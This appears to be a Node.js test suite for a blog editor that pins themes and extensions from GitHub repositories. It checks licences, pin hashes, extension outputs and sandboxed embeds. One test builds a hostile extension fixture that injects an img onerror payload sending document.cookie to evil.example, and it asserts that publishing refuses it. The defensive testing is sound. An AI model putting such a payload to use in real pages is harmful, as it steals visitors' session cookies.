import test from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import { createNet } from '../app/net.js';
import { GitHub } from '../app/github.js';
import { clearPackCache, loadPacks } from '../app/packs.js';
import { describePlan, executePlan, planChange, planExtension, planSettings, planTheme } from '../app/site.js';
import { loadBlog } from '../app/read.js';
import { blogToForm } from '../lib/settings.js';
import { buildSite } from '../lib/blog.js';
import { parseOutputsFile } from '../lib/extensions.js';
import { sha256 } from '../lib/sha256.js';
import { EX, readDirFiles } from './helpers.js';
import { fakeGitHub } from './fake-github.js';

const dec = new TextDecoder();
const code = (c) => (e) => {
  if (e.code === undefined) console.error(e);
  return e.code === c;
};

// A world with: the example blog, two themes, an extension, and an embed's pinned asset — none of them
// listed anywhere (there is no list in this world at all).
async function world({ theme = 'theme-plain', patch = {}, extra = {} } = {}) {
  clearPackCache();
  const blogFiles = await readDirFiles(path.join(EX, 'blog'));
  const themeFiles = await readDirFiles(path.join(EX, theme));
  const classic = await readDirFiles(path.join(EX, 'theme-classic'));
  const extFiles = await readDirFiles(path.join(EX, 'ext-reading-time'));
  const repos = {
    'example/blog': blogFiles,
    'me/theme': themeFiles,
    'me/classic': classic,
    'me/ext': extFiles,
    'example/images': { 'README.md': 'i' },
    ...extra,
  };
  for (const [k, v] of Object.entries(patch)) repos[k] = v;
  const names = Object.keys(repos).filter((r) => r.startsWith('me/'));
  const server = fakeGitHub(repos, {
    tags: Object.fromEntries(names.map((r) => [r, ['v1.0.0']])),
    aliases: Object.fromEntries(names.map((r) => [r, { 'v1.0.0': 'main', [sha1]: 'main' }])),
  });
  await server.ready;
  const net = createNet(server.fetch);
  return { server, net, gh: new GitHub(net, { token: 'github_pat_test' }), anon: new GitHub(net) };
}
const sha1 = 'e'.repeat(40);

// Test-only runner: runs the fixture extension in-process. Production runs it in the sandbox.
const runner = (calls) => async ({ extension, hook, ctx, input }) => {
  calls?.push({ hook, slug: ctx.slug });
  const mod = await import('data:text/javascript;base64,' + Buffer.from(extension.source).toString('base64'));
  return mod.hooks[hook](input, ctx);
};

// ---------- X9: a theme with no entry in any list works by its address ----------
test('X9: a theme is used by repository address; no list is involved, and the plan names its licence', async () => {
  const { server, net, gh } = await world();
  const plan = await planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref: 'v1.0.0' } });
  assert.equal(net.ledger.uploaded.bytes, 0, 'planning uploads nothing');
  assert.deepEqual(plan.licences.map((l) => [l.kind, l.name, l.licence]), [['theme', 'Plain Paper', 'MIT']]);
  const paths = plan.changes.map((c) => c.path).sort();
  for (const p of ['blog.json', 'theme.css', 'index.html', 'licences.json', 'static-hls-in-git/index.html', 'markdown-is-the-format/index.html']) assert.ok(paths.includes(p), p);
  assert.ok(!paths.some((p) => p.startsWith('posts/')), 'posts are never touched');

  await executePlan(gh, plan);
  const after = server.files('example/blog');
  const blog = JSON.parse(after['blog.json']);
  assert.deepEqual(Object.keys(blog.theme).sort(), ['contract', 'licence', 'name', 'ref', 'repo', 'sha256', 'version']);
  assert.equal(blog.theme.ref, 'v1.0.0');
  assert.match(blog.theme.sha256, /^[0-9a-f]{64}$/);
  assert.ok(after['index.html'].includes('url("https://cdn.jsdelivr.net/gh/me/theme@v1.0.0/img/rule.svg")'));
  assert.equal(JSON.parse(after['licences.json']).dependencies[0].licence, 'MIT');

  // what a later reader or CI regenerates from this repository alone is exactly what was committed
  const posts = Object.entries(after).filter(([p]) => p.startsWith('posts/')).map(([p, t]) => ({ path: p, text: t }));
  const packs = await loadPacks(new GitHub(net), blog);
  const regen = buildSite({ blog: after['blog.json'], lock: JSON.parse(after['assets.lock.json']), posts, ...packs });
  for (const [p, c] of Object.entries(regen.files)) assert.equal(after[p], c, p);
});

test('X9: stopping the theme removes theme.css and returns to the default theme', async () => {
  const { server, gh } = await world();
  await executePlan(gh, await planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref: 'v1.0.0' } }));
  assert.ok('theme.css' in server.files('example/blog'));
  const back = await planTheme(gh, { repo: 'example/blog', branch: 'main', use: null });
  assert.ok(back.changes.some((c) => c.delete && c.path === 'theme.css'));
  await executePlan(gh, back);
  const after = server.files('example/blog');
  assert.ok(!('theme.css' in after) && !('theme' in JSON.parse(after['blog.json'])));
  assert.ok(after['index.html'].includes('header.site{display:flex'));
});

test('classic theme: switching it on changes the markup of every page (X7 through the editor path)', async () => {
  const { server, gh } = await world();
  const plan = await planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/classic', ref: 'v1.0.0' } });
  assert.equal(plan.licences[0].licence, 'GPL-2.0-or-later');
  await executePlan(gh, plan);
  const after = server.files('example/blog');
  assert.ok(after['static-hls-in-git/index.html'].includes('class="entry-content"') && after['index.html'].includes('<body class="home blog">'));
  assert.equal(JSON.parse(after['blog.json']).theme.contract, 'wordpress-classic');
});

// ---------- X4 ----------
test('X4: a branch, an unknown tag, or an ambiguous name cannot be pinned', async () => {
  const { server, gh, net } = await world();
  const use = (ref) => planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref } });
  await assert.rejects(use('main'), (e) => e.code === 'unpinned-ref' && /is a branch/.test(e.detail));
  await assert.rejects(use('v9.9.9'), (e) => e.code === 'unpinned-ref' && /has no tag/.test(e.detail));
  await assert.rejects(use('latest'), code('unpinned-ref'));
  // a name that is both a tag and a branch means two things: refused
  server.state['me/theme'].branches['v1.0.0'] = server.state['me/theme'].branches.main;
  await assert.rejects(use('v1.0.0'), (e) => e.code === 'unpinned-ref' && /both a tag and a branch/.test(e.detail));
  delete server.state['me/theme'].branches['v1.0.0'];
  // a commit sha is always a valid pin
  const ok = await use(sha1);
  assert.equal(ok.licences[0].ref, sha1);
  assert.equal(net.ledger.uploaded.bytes, 0);
});

test('X4: a theme or extension that changed after it was pinned refuses every later build', async () => {
  const { server, gh } = await world();
  await executePlan(gh, await planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref: 'v1.0.0' } }));
  const pinnedBlog = server.files('example/blog');
  // same blog.json, but the tag now serves different css
  const themeFiles = await readDirFiles(path.join(EX, 'theme-plain'));
  themeFiles['style.css'] = new TextEncoder().encode(dec.decode(themeFiles['style.css']) + '\nbody{background:red}');
  const { gh: gh2 } = await world({ patch: { 'example/blog': Object.fromEntries(Object.entries(pinnedBlog).map(([k, v]) => [k, new TextEncoder().encode(v)])), 'me/theme': themeFiles } });
  await assert.rejects(planSettings(gh2, { repo: 'example/blog', branch: 'main', form: blogToForm(JSON.parse(pinnedBlog['blog.json'])) }), (e) => e.code === 'pin-mismatch' && /changed after it was pinned/.test(e.detail));
  const text = Object.fromEntries(Object.entries(pinnedBlog).filter(([p]) => p.startsWith('posts/')));
  await assert.rejects(planChange(gh2, { repo: 'example/blog', branch: 'main', slug: 'markdown-is-the-format', text: text['posts/markdown-is-the-format.md'].replace('every tool', 'each tool') }), code('pin-mismatch'));
});

// ---------- X5 at the point of pinning ----------
test('X5: a theme or extension with no licence cannot be pinned', async () => {
  const noLicence = async (dir, file) => {
    const files = await readDirFiles(path.join(EX, dir));
    const m = JSON.parse(dec.decode(files[file]));
    delete m.licence;
    files[file] = new TextEncoder().encode(JSON.stringify(m));
    return files;
  };
  const { gh } = await world({ patch: { 'me/theme': await noLicence('theme-plain', 'theme.json'), 'me/ext': await noLicence('ext-reading-time', 'extension.json') } });
  await assert.rejects(planTheme(gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref: 'v1.0.0' } }), code('no-licence'));
  await assert.rejects(planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' }, runner: runner() }), code('no-licence'));
  const bad = await world({ patch: { 'me/theme': await (async () => { const f = await readDirFiles(path.join(EX, 'theme-plain')); f['theme.json'] = new TextEncoder().encode(dec.decode(f['theme.json']).replace('"MIT"', '"Proprietary"')); return f; })() } });
  await assert.rejects(planTheme(bad.gh, { repo: 'example/blog', branch: 'main', use: { where: 'me/theme', ref: 'v1.0.0' } }), code('bad-licence'));
});

// ---------- extensions: run at publish, committed as data ----------
test('extensions: pinning one runs it only in the runner, and its output is committed as data', async () => {
  const { server, gh } = await world();
  const calls = [];
  const plan = await planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' }, runner: runner(calls) });
  assert.deepEqual(plan.licences.map((l) => [l.kind, l.name, l.licence]), [['theme', 'default', 'GPL-3.0-only'], ['extension', 'Reading time', 'MIT']]);
  assert.deepEqual(calls.map((c) => c.slug).sort(), ['markdown-is-the-format', 'static-hls-in-git'], 'one run per post, in the sandbox runner');
  assert.ok(plan.changes.some((c) => c.path === 'extension-outputs.json'));
  await executePlan(gh, plan);
  const after = server.files('example/blog');
  assert.ok(/<p class="reading-time">\d+ min read<\/p>/.test(after['static-hls-in-git/index.html']));
  const blog = JSON.parse(after['blog.json']);
  assert.deepEqual(Object.keys(blog.extensions[0]).sort(), ['hooks', 'kind', 'licence', 'name', 'ref', 'repo', 'sha256', 'version']);
  assert.equal(Object.keys(parseOutputsFile(after['extension-outputs.json'])).length, 2);
  // the page that was committed contains no extension code, only its output
  assert.ok(!/export const hooks|function\(|=>/.test(after['static-hls-in-git/index.html'].replace(/<style>[\s\S]*?<\/style>/, '')));
});

test('extensions: with no runner (the CLI, CI, or any non-editor path) nothing runs and the change is refused', async () => {
  const { gh, net } = await world();
  await assert.rejects(planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' } }), (e) => e.code === 'extension-output-missing' && /editor/.test(e.detail));
  assert.equal(net.ledger.uploaded.bytes, 0);
});

test('extensions: publishing a post runs only what is new; recorded outputs are reused', async () => {
  const { server, gh } = await world();
  await executePlan(gh, await planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' }, runner: runner() }));
  const calls = [];
  const text = '---\nslug: fresh\ntitle: Fresh\ndate: 2026-12-01\nstatus: published\n---\n\nNew words here.\n';
  const plan = await planChange(gh, { repo: 'example/blog', branch: 'main', slug: 'fresh', text, create: true, runner: runner(calls) });
  assert.deepEqual(calls, [{ hook: 'post:html', slug: 'fresh' }], 'the two existing posts were not run again');
  await executePlan(gh, plan);
  assert.equal(Object.keys(parseOutputsFile(server.files('example/blog')['extension-outputs.json'])).length, 3);
  // editing a post re-runs just that post, and the old output is dropped from the file
  const calls2 = [];
  const edit = await planChange(gh, { repo: 'example/blog', branch: 'main', slug: 'fresh', text: text.replace('New words', 'Other words'), runner: runner(calls2) });
  assert.equal(calls2.length, 1);
  await executePlan(gh, edit);
  assert.equal(Object.keys(parseOutputsFile(server.files('example/blog')['extension-outputs.json'])).length, 3, 'pruned, not accumulated');
});

test('extensions: removing the last one deletes extension-outputs.json and the extension\'s effect', async () => {
  const { server, gh } = await world();
  await executePlan(gh, await planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' }, runner: runner() }));
  const plan = await planExtension(gh, { repo: 'example/blog', branch: 'main', remove: 'me/ext' });
  assert.ok(plan.changes.some((c) => c.delete && c.path === 'extension-outputs.json'));
  await executePlan(gh, plan);
  const after = server.files('example/blog');
  assert.ok(!('extension-outputs.json' in after) && !('extensions' in JSON.parse(after['blog.json'])) && !/reading-time/.test(after['static-hls-in-git/index.html'].replace(/<style>[\s\S]*?<\/style>/, '')));
});

test('extensions: a hostile extension is refused at publish and nothing is written', async () => {
  const evil = `export const hooks = { 'post:html'(h) { return h + '<img src=x onerror="fetch(\\'//evil.example/?\\'+document.cookie)">'; } };`;
  const files = await readDirFiles(path.join(EX, 'ext-reading-time'));
  files['index.mjs'] = new TextEncoder().encode(evil);
  const { gh, net } = await world({ patch: { 'me/ext': files } });
  await assert.rejects(planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/ext', ref: 'v1.0.0' }, runner: runner() }), (e) => e.code === 'unsafe-extension-output' && /onerror/.test(e.detail));
  assert.equal(net.ledger.uploaded.bytes, 0);
});

// ---------- X3 through the whole path: an embed extension ----------
const CHART_URL = 'https://cdn.jsdelivr.net/gh/me/embed-assets@v1.0.0/chart.html';
async function embedWorld(hash) {
  const asset = new TextEncoder().encode('<!doctype html><title>chart</title><p>a chart</p>');
  const manifest = { name: 'Chart', version: '1.0.0', licence: 'MIT', kind: 'embed', hooks: ['post:html'], capabilities: [], pinned_assets: [{ url: CHART_URL, sha256: hash || sha256(asset) }] };
  const source = `export const hooks = { 'post:html'(h) { return h + '<iframe src="${CHART_URL}" sandbox="allow-scripts" title="Chart" width="600" height="300"></iframe>'; } };`;
  return world({ extra: { 'me/embed': { 'extension.json': JSON.stringify(manifest), 'index.mjs': source }, 'me/embed-assets': { 'chart.html': asset } } });
}

test('X3: an embed extension frames only its pinned asset, sandboxed, and the asset hash is checked when it is pinned', async () => {
  const { server, gh } = await embedWorld();
  const plan = await planExtension(gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/embed', ref: 'v1.0.0' }, runner: runner() });
  await executePlan(gh, plan);
  const page = server.files('example/blog')['static-hls-in-git/index.html'];
  const frames = [...page.matchAll(/<iframe\b[^>]*>/g)].map((m) => m[0]).filter((f) => f.includes('chart.html'));
  assert.equal(frames.length, 1);
  assert.equal(frames[0], `<iframe src="${CHART_URL}" sandbox="allow-scripts" referrerpolicy="no-referrer" loading="lazy" title="Chart" width="600" height="300">`);
  const wrong = await embedWorld('0'.repeat(64));
  await assert.rejects(planExtension(wrong.gh, { repo: 'example/blog', branch: 'main', add: { where: 'me/embed', ref: 'v1.0.0' }, runner: runner() }), code('pin-mismatch'));
});
